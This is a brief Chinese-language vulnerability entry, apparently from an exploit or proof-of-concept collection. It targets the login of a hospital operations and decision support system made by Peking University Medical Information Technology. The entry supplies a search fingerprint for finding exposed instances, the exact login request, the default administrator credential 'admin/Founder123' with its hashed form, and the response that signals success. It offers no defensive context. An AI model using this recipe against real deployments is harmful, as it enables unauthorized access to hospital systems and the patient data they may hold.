# 北大医疗信息技术有限公司运营管理与决策支持系统AjaxLogIn存在弱口令漏洞

北大医疗信息技术有限公司运营管理与决策支持系统 ｜ 默认口令 ｜ —
- **指纹**：`body="/hospital/beijing/BeiDaYiXin/login/iconfont/style.css"`
- **请求**：`POST /login/AjaxLogIn HTTP/1.1`

**Payload**
```
admin/Founder123
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
username=admin&password=35158adeafe2b02a17f2a42e9a88cc02
```
- **响应特征**：200